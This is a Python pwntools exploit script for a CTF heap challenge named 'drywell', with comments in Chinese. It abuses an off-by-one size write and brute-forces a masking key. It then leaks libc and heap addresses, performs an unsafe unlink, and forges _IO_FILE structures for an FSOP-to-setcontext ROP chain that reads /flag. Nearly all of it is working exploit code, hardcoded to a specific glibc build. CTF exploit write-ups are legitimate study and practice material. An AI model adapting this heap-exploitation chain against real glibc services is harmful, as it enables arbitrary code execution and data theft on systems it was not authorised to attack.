#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
drywell exploit (2026 强网杯)

漏洞：`edit` 在 data[cap] 越界写一个字节，正好落在下一个 chunk 的 size 最低字节，
      且只改高半字节：((len>>4) ^ poison_key) & 0xe。poison_key 来自 /key（低 4 位），
      容器内 socat fork 共享同一个 key，所以一次探测对整个实例有效。

利用链（题解第 3 节，偏移全部硬编码）：
  1. 探测 poison_key（错 key 时 free(1) 必然 abort，连接断开即"否定"）。
  2. 0xa0 remainder 压住 note2：把 note1 的 size 从 0x500 拉到 0x5a0，
     free(1) 后 add(0) 切出 0xa0 余块，正好落在 note2 数据区；再 free(3) 进
     unsorted，view(2,0)/view(2,8) 一次拿到 libc 与 heap。
  3. 前向合并让 note6 覆盖 note7/8/9（0x5a0 + 0xb00 = 0x10a0）。
  4. unsafe unlink 把 ledger 里 note7.data 改成 T-0x18（T = notes+7*0x18）。
  5. 在 note9/10/11 伪造 _IO_FILE / _IO_wide_data / vtable，
     写穿 ledger 把 note8.data 改成 _IO_list_all 并挂上假 FILE，
     quit -> exit -> _IO_flush_all_lockp -> _IO_wfile_overflow -> setcontext -> ORW。

用法：
    python exp.py TARGET_HOST PORT
    python exp.py --local ./chal
"""
import argparse
import struct
import sys

from pwn import ELF, context, log, process, remote

context.log_level = 'info'
context.arch = 'amd64'

# ---------------------------------------------------------------- libc 2.43 偏移
OFF_UNSORTED_FD = 0x212ac8
OFF_HEAP_LEAK = 0x1030
OFF_POP_RSP = 0x3ca45
OFF_POP_RDI = 0x11b9fa
OFF_POP_RSI = 0x11ccbb
OFF_POP_RBP = 0x2aafc
OFF_POP_RDX_LEAVE = 0x9fead
OFF_SETCONTEXT_2D = 0x4bead
OFF_OPENAT = 0x127a90
OFF_READ = 0x128150
OFF_WRITE = 0x128c10
OFF_EXIT = 0xf7180
OFF_IO_WFILE_JUMPS = 0x211228
OFF_IO_LIST_ALL = 0x213480

# ---------------------------------------------------------------- 程序常量
LEDGER_OFF = 0x10           # notes 落在 heap+0x10
NOTE_STRIDE = 0x18          # sizeof(Note)
N7_SLOT = 7
T_OFF = LEDGER_OFF + N7_SLOT * NOTE_STRIDE       # notes[7].data 的格子 = heap+0xb8

N6_OFF = 0x2250             # 合并后 note6 的数据区（题解给出的固定值）
N10_OFF = N6_OFF + 0xf00 + 0x500                 # note9 + 0x500
N11_OFF = N6_OFF + 0xf00 + 0xa00                 # note9 + 0xa00

DEFAULT_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999

p64 = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)


def clean_length(minimum, k):
    """((len >> 4) ^ k) & 0xe == 0，即把目标 chunk 的 size 低字节清成 0x?0。"""
    return minimum + ((k & 0xe) << 4)


def sized_length(minimum, k, high_nibble):
    """((len >> 4) ^ k) & 0xe == high_nibble，例如 0xa 让 0x500 -> 0x5a0。"""
    return minimum + (((k ^ high_nibble) & 0xe) << 4)


def put(buf, off, value):
    buf[off:off + 8] = p64(value)


class Vault:
    def __init__(self, host=None, port=None, local=None):
        if local:
            self.io = process(local)
        else:
            self.io = remote(host, port)
        self.io.recv(timeout=0.5)

    # --- 基础命令 ---------------------------------------------------------
    def add(self, cls):
        self.io.sendline(b"add %d" % cls)
        self.io.recv(timeout=0.4)

    def edit(self, idx, data):
        self.io.sendline(b"edit %d %d" % (idx, len(data)))
        self.io.recv(timeout=0.2)
        self.io.send(bytes(data))
        self.io.recv(timeout=0.4)

    def view(self, idx, off):
        self.io.sendline(b"view %d %d" % (idx, off))
        line = self.io.recvline(timeout=2.0)
        if not line:
            raise EOFError("no view response")
        text = line.strip().split()[-1]
        return int(text, 16)

    def free(self, idx):
        self.io.sendline(b"free %d" % idx)
        self.io.recv(timeout=0.3)

    def alive(self, timeout=0.5):
        try:
            self.io.sendline(b"add 0")
            data = self.io.recv(timeout=timeout)
            return bool(data)
        except Exception:
            return False

    def close(self):
        try:
            self.io.close()
        except Exception:
            pass


# ---------------------------------------------------------------- key 探测
def probe_key(host, port, local, guess):
    v = Vault(host, port, local)
    try:
        for _ in range(3):
            v.add(0)
        v.edit(0, b'Q' * clean_length(0x100, guess))
        v.free(1)
        # 错 key 时 note1.size 被改坏，free(1) 在 consolidate 校验时 abort
        return v.alive()
    except Exception:
        return False
    finally:
        v.close()


def find_key(host, port, local):
    for guess in range(0, 16, 2):
        if probe_key(host, port, local, guess):
            log.success("poison_key = 0x%x" % guess)
            return guess
    raise RuntimeError("poison_key not found")


# ---------------------------------------------------------------- 主利用
def exploit(host, port, local, flag_path):
    k = find_key(host, port, local)
    L = lambda minimum: clean_length(minimum, k)          # 清高半字节
    S = lambda minimum, h: sized_length(minimum, k, h)    # 指定高半字节

    io = Vault(host, port, local)

    # --- 1. 0xa0 remainder 压住 note2，双泄漏 -----------------------------
    for _ in range(5):
        io.add(0)                                          # notes[0..4]
    b = bytearray(L(0x200))
    put(b, 0x98, 0x21)          # 余块 next.size
    put(b, 0xb8, 0x21)          # next-next PREV_INUSE
    io.edit(2, bytes(b))
    io.edit(0, b'A' * S(0x100, 0xa))                       # note1: 0x500 -> 0x5a0
    io.free(1)
    io.add(0)                                              # 从 0x5a0 里切出 0xa0 余块
    io.free(3)                                             # 进 unsorted，fd/bk 落在 note2
    libc_leak = io.view(2, 0)
    heap_leak = io.view(2, 8)
    libc = libc_leak - OFF_UNSORTED_FD
    heap = heap_leak - OFF_HEAP_LEAK
    if libc & 0xfff:
        raise RuntimeError("bad libc leak %#x" % libc)
    log.success("libc  = %#x" % libc)
    log.success("heap  = %#x" % heap)

    # --- 2. 前向合并：note6 覆盖 note7/8/9 --------------------------------
    for _ in range(8):
        io.add(0)                                          # 填满 notes[3,5..11]
    n6 = heap + N6_OFF
    n7 = n6 + 0x500
    n8 = n6 + 0xa00
    n9 = n6 + 0xf00
    n10 = heap + N10_OFF
    n11 = heap + N11_OFF
    T = heap + T_OFF                                       # notes[7].data 格子

    fake = n7 + 0x90
    b = bytearray(L(0x200))
    put(b, 0x98, 0xb01)         # 伪造空闲块 size（PREV_INUSE 保留）
    put(b, 0xa0, fake)          # fd = bk = fake
    put(b, 0xa8, fake)
    io.edit(7, bytes(b))
    b = bytearray(L(0x200))
    put(b, 0x190, 0xb00)        # note9.prev_size
    put(b, 0x198, 0x20)         # note9.size
    io.edit(9, bytes(b))
    io.edit(5, b'A' * S(0x100, 0xa))                       # note5: 0x500 -> 0x5a0
    io.free(6)                                             # 向前合并成 0x10a0
    io.add(2)                                              # note6 现在覆盖 7/8/9

    # --- 3. unsafe unlink：notes[7].data -> T-0x18 ------------------------
    b = bytearray(S(0xf00, 0xa))
    put(b, 0x508, 0x4f1)        # fake prev chunk.size
    put(b, 0x510, T - 0x18)     # fd -> fd->bk == *T
    put(b, 0x518, T - 0x10)     # bk -> bk->fd == *T
    put(b, 0x9f0, 0x4f0)        # note8.prev_size
    put(b, 0x9f8, 0x500)        # note8.size，清掉 PREV_INUSE
    put(b, 0xef8, 0x501)        # 还原 note9.size
    io.edit(6, bytes(b))
    io.free(8)                  # notes[7].data 变成 T-0x18

    # --- 4. 伪造 _IO_FILE / _IO_wide_data / ORW 链 ------------------------
    file_ptr, wide_data, fake_vtable = n9, n10, n11
    path_a, outbuf = n11 + 0x100, n11 + 0x180
    pop_rsp = libc + OFF_POP_RSP
    pop_rdi = libc + OFF_POP_RDI
    pop_rsi = libc + OFF_POP_RSI
    pop_rbp = libc + OFF_POP_RBP
    pop_rdx_leave = libc + OFF_POP_RDX_LEAVE

    vt = bytearray(L(0x300))
    put(vt, 0x68, libc + OFF_SETCONTEXT_2D)               # _IO_wfile_jumps 的 doallocate 槽
    target_path = flag_path.encode() + b'\0'
    vt[0x100:0x100 + len(target_path)] = target_path
    io.edit(11, bytes(vt))

    w = bytearray(L(0x400))
    chain, f1, f2, f3 = 0x100, 0x188, 0x248, 0x308
    put(w, 0x00, wide_data + chain)     # pop rsp; ret 落点
    put(w, 0x18, 0)                     # _IO_write_base
    put(w, 0x20, 1)                     # _IO_write_ptr > _IO_write_base
    put(w, 0x30, 0)                     # _IO_buf_base = 0，强制 _IO_wdoallocbuf
    put(w, 0xe0, fake_vtable)           # _wide_vtable

    def wr(base, vals):
        for i, v in enumerate(vals):
            put(w, base + 8 * i, v)

    # openat(AT_FDCWD, path, 0) -> fd 3
    wr(chain, [pop_rdi, (1 << 64) - 100, pop_rsi, path_a,
               pop_rbp, wide_data + f1, pop_rdx_leave, 0])
    wr(f1, [0, libc + OFF_OPENAT,
            pop_rdi, 3, pop_rsi, outbuf,
            pop_rbp, wide_data + f2, pop_rdx_leave, 0x100])
    # read(3, outbuf, 0x100)
    wr(f2, [0, libc + OFF_READ,
            pop_rdi, 1, pop_rsi, outbuf,
            pop_rbp, wide_data + f3, pop_rdx_leave, 0x100])
    # write(1, outbuf, 0x100); _exit(1)
    wr(f3, [0, libc + OFF_WRITE, libc + OFF_EXIT])
    io.edit(10, bytes(w))

    f = bytearray(L(0x300))
    for off, v in ((0x00, 0xfbad8000),      # _flags | _IO_USER_LOCK
                   (0x68, 0),               # _chain = NULL
                   (0x88, n11 + 0x280),     # _lock -> 可写内存
                   (0xa0, wide_data),
                   (0xa8, pop_rsp),
                   (0xc0, 1),               # _mode = 1
                   (0xd8, libc + OFF_IO_WFILE_JUMPS),
                   (0xe0, file_ptr + 0x200),
                   (0x1c0, 0x1f80)):        # 合法 MXCSR
        put(f, off, v)
    io.edit(9, bytes(f))

    # --- 5. 写穿 ledger，把假 FILE 挂上 _IO_list_all ----------------------
    a = bytearray()
    for i in range(6, 12):
        addr = (n6, T - 0x18, libc + OFF_IO_LIST_ALL, n9, n10, n11)[i - 6]
        cap = 0xff8 if i == 6 else 0x4f8
        a += p64(addr) + p64(0) + p64(cap)
    io.edit(7, bytes(a))                    # note8.data -> _IO_list_all
    io.edit(8, p64(file_ptr))               # _IO_list_all = fake FILE

    log.info("FSOP ready, quit triggers _IO_flush_all_lockp -> setcontext -> ORW")
    io.io.sendline(b"quit")
    out = io.io.recvall(timeout=5)
    io.close()

    idx = out.find(b'flag{')
    if idx >= 0:
        end = out.find(b'}', idx)
        return out[idx:end + 1]
    return out


def main():
    ap = argparse.ArgumentParser(description="drywell exploit")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--local", metavar="BIN", default=None)
    ap.add_argument("--flag-path", default="/flag")
    args = ap.parse_args()

    out = exploit(args.host, args.port, args.local, args.flag_path)
    if out.startswith(b"flag{"):
        print("[+] FLAG:", out.decode('latin-1'))
    else:
        print("[*] output:", repr(out[-2048:]))


if __name__ == "__main__":
    main()
